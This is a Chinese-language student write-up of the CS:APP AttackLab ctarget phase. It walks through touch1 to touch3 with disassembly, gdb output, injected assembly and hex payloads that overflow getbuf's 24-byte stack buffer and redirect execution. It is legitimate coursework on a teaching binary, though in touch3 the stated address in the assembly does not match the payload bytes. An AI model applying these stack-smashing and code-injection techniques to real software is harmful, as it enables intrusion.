# AttackLab 思路
## ctarget
ctarget的三个touch都是通过栈溢出攻击实现的。首先根据attacklab的writeup中所给信息：
``` c
unsigned getbuf()
{
    charbuf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```
以及ctarget中反汇编所得信息：
``` asm
00000000004016e7 <getbuf>:
  4016e7:	48 83 ec 18          	sub    $0x18,%rsp
  4016eb:	48 89 e7             	mov    %rsp,%rdi
  4016ee:	e8 7d 02 00 00       	callq  401970 <Gets>
  4016f3:	b8 01 00 00 00       	mov    $0x1,%eax
  4016f8:	48 83 c4 18          	add    $0x18,%rsp
  4016fc:	c3                   	retq   
```
可知，BUFFER_SIZE为$0x18$，即24个字节。
#### touch1
观察touch1的源代码：
``` c
void touch1()
{
    vlevel=1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```
可知我们只需要通过缓冲区溢出攻击覆盖掉getbuf的返回地址，即可完成该任务，由反汇编得知，touch1的地址为$0x4016FD$
``` asm
00000000004016fd <touch1>:
  4016fd:	48 83 ec 08          	sub    $0x8,%rsp
  401701:	c7 05 f1 2d 20 00 01 	movl   $0x1,0x202df1(%rip)
......
```
因此我们可以通过下面的字符串完成攻击（需先使用hex2raw转换为二进制）
``` plain
ctargetString/touch1.txt:

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
FD 16 40 00 00 00 00 00

```
#### touch2
观察touch2的源代码：
``` c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
        }
    exit(0);
}
```
我们必须让`val`的值与`cookie`相等（在本实验中`cookie`的值为$0x754E7DDD$），因此我们必须让程序执行下列汇编代码：
``` asm
intro.touch2.s

mov $0x754e7ddd,%edi
push $0x401729
ret
```
第一行是将`cookie`作为参数传入，第二行将`touch2`的函数地址压栈，第三行返回，即可跳转至`touch2`。
现在的任务就是让程序执行上述指令，我们可以通过将上述指令的机器码压入栈中，让getbuf跳转至栈上储存上述指令的区域来实现。
由gdb调试可知，`charbuf`的首地址为$0x556453F8$
``` plain
(gdb) r
Starting program: /winshare/csapp-homework/10235101439/target3/ctarget -q -i ctargetString/touch2.raw
Cookie: 0x754e7ddd

Breakpoint 3, getbuf () at buf.c:14
14      in buf.c
=> 0x00000000004016eb <getbuf+4>:       48 89 e7        mov    %rsp,%rdi
   0x00000000004016ee <getbuf+7>:       e8 7d 02 00 00  callq  0x401970 <Gets>
(gdb) p /x $rsp
$3 = 0x556453f8
```
于是我们将上述汇编代码转换成机器码后作为字符串输入，并将getbuf的返回地址覆盖为$0x556453F8$。即，我们输入的字符串的二进制序列为：
``` plain
ctargetString/touch2.txt

bf dd 7d 4e 75 68 29 17
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
f8 53 64 55 00 00 00 00
```
#### touch3
由writeup中给出的代码：
``` c
void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```
而`touch3`中调用的函数`hexmatch`如下：
``` c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```
该函数的目标是将`sval`指向的字符串与`cookie`的16进制字符串形式作比较，若相等则返回1，否则返回0。
当`hexmatch`的返回值为1时则表示`touch3`被解决。
类似于`touch2`，但是我们这次需要在`%rdi`中存入的是字符串的地址
``` asm
intro.touch3.s

mov $0x55645403,%edi
push $0x401837
ret
```
同时，由于调用了一些函数，栈中较低地址的位置会被覆盖掉，因此我们将字符串放置于栈的末尾，需要传入的字符串的二进制表示如下：
``` plain
bf 18 54 64 55 68 37 18
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
f8 53 64 55 00 00 00 00
37 35 34 65 37 64 64 64 00
```
`cookie`转为二进制表示由以下辅助程序完成：
``` c
//printcookie.c
#include <stdio.h>

int main()
{
    char cookie_str[100];
    sprintf(cookie_str, "%.8x\n", 0x754e7ddd);
    char a;
    int idx = 0;
    while ((a = cookie_str[idx++]) != '\0')
    {
        printf("%.2x ", a);
    }
    printf("\n");
    return 0;
}
```
